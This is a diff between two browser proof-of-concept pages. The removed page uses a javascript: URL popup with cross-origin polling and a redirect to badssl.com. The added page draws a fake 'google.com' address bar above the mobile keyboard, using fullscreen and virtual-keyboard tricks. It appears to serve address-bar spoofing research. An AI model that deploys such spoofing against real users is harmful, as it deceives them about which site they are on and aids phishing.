@@ -1,104 +1,114 @@
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Crash me (centered & bigger)</title>
-  <style>
-    /* center the page content both horizontally and vertically */
-    html, body {
-      height: 100%;
-      margin: 0;
-    }
-    body {
-      display: flex;
-      align-items: center;       /* vertical center */
-      justify-content: center;   /* horizontal center */
-      background: #f3f4f6;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fake Mini URL Bar Above Keyboard</title>
+<style>
+  button { padding: 12px 18px; font-size: 16px; margin-right: 10px; }
+  textarea { width: 100%; height: 80px; font-size: 18px; margin-top: 20px; }
 
-    /* style the link so it looks like a big button */
-    a.crash-link {
-      display: inline-block;
-      font-size: 56px;           /* make it big — change as needed */
-      font-weight: 700;
-      text-decoration: none;
-      padding: 18px 36px;
-      border-radius: 12px;
-      background: #ffdddd;
-      color: #a00;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
-      cursor: pointer;
-      user-select: none;
-    }
+  .fake-bar {
+    text-align: center;
+    background: #fff7f0;
+    border-top: 1px solid #e0cbb0;
+    border-bottom: 1px solid #e0cbb0;
+    color: #222;
+    font-size: 16px;
+    padding: 5px 0;
+    position: fixed;
+    width: 100%;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, bottom 0.2s ease;
+  }
 
-    a.crash-link:active { transform: translateY(1px); }
-    a.crash-link:hover  { filter: brightness(0.98); }
-  </style>
+  .fake-bar.show {
+    opacity: 1;
+    visibility: visible;
+  }
+
+</style>
 </head>
 <body>
 
-  <a href="#" class="crash-link" onclick="f(); return false;">Crash me</a>
+<button id="showBtn">Show Keyboard</button>
+<textarea id="ta" placeholder="Textarea for forced focus…"></textarea>
 
-  <script>
-    // make variables local to avoid polluting global scope
-    let w = null;
-    let watcher = null;
+<div class="fake-bar" id="fakeBar">google.com</div>
 
-    function next() {
-      // original behavior: replace location of the popup (or main window if desired)
+<script>
+const fakeBar = document.getElementById('fakeBar');
+const ta = document.getElementById('ta');
+
+// Adjust fake bar position above keyboard
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  let keyboardHeight = 0;
+
+  if (vv) {
+    // Calculate height of virtual keyboard
+    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
+  }
+
+  fakeBar.style.bottom = keyboardHeight + 'px';
+}
+
+// Show the fake bar
+function showFakeBar() {
+  fakeBar.classList.add('show');
+  adjustFakeBar();
+
+  // create meta refresh
+  var meta = document.createElement("meta");
+  meta.httpEquiv = "refresh";
+  meta.content = "0;url=https://google.com";
+  document.head.appendChild(meta);
+}
+
+// Hide the fake bar
+function hideFakeBar() {
+  fakeBar.classList.remove('show');
+}
+
+// Listen for viewport changes (keyboard show/hide)
+if ('visualViewport' in window) {
+  window.visualViewport.addEventListener('resize', () => {
+    if (document.activeElement === ta) adjustFakeBar();
+  });
+}
+
+// Handle orientation changes
+window.addEventListener('orientationchange', adjustFakeBar);
+
+// Button click: show keyboard + fake bar
+document.getElementById("showBtn").onclick = async () => {
+  ta.focus();
+
+  try {
+    await document.documentElement.requestFullscreen();
+    setTimeout(() => {
+      document.exitFullscreen().catch(() => {});
+    }, 120);
+  } catch (e) {
+  }
+
+  setTimeout(async () => {
+    if (navigator.virtualKeyboard?.show) {
       try {
-        if (w && !w.closed) {
-          // attempt to redirect the popup
-          w.location.replace('http://wrong.host.badssl.com/');
-        } else {
-          // fallback: if popup already closed, redirect the current page
-          window.location.replace('http://wrong.host.badssl.com/');
-        }
+        await navigator.virtualKeyboard.show();
       } catch (e) {
-        // If cross-origin prevents us, at least ensure the interval is cleared
-        console.error('next() error:', e);
       }
     }
 
-    function f() {
-      // open a new window. This uses a javascript: URL like your original,
-      // but note: browsers sometimes block or sanitize `javascript:` URLs.
-      w = window.open(
-        "javascript:document.write('spoof');location='http://twitter.com'",
-        "new",
-        "width=500,height=500"
-      );
+    showFakeBar();
+  }, 150);
+};
 
-      // clear any previous watcher
-      if (watcher) {
-        clearInterval(watcher);
-        watcher = null;
-      }
+// Hide fake bar when textarea loses focus
+ta.addEventListener('blur', hideFakeBar);
+</script>
 
-      // poll safely with a small but reasonable interval (not 1ms)
-      watcher = setInterval(function () {
-        try {
-          // accessing w.location.href will throw if popup navigated cross-origin
-          // or if the window is closed. That's the original detection mechanism.
-          const x = w.location.href;
-          // if you want, you can log or inspect x here:
-          // console.log('popup href:', x);
-        } catch (e) {
-          // when access throws, run next() (as in your original PoC)
-          clearInterval(watcher);
-          watcher = null;
-          next();
-        }
-
-        // if the popup gets closed by user, stop the watcher
-        if (!w || w.closed) {
-          clearInterval(watcher);
-          watcher = null;
-        }
-      }, 100); // 100ms is responsive but not wasteful
-    }
-  </script>
 </body>
 </html>
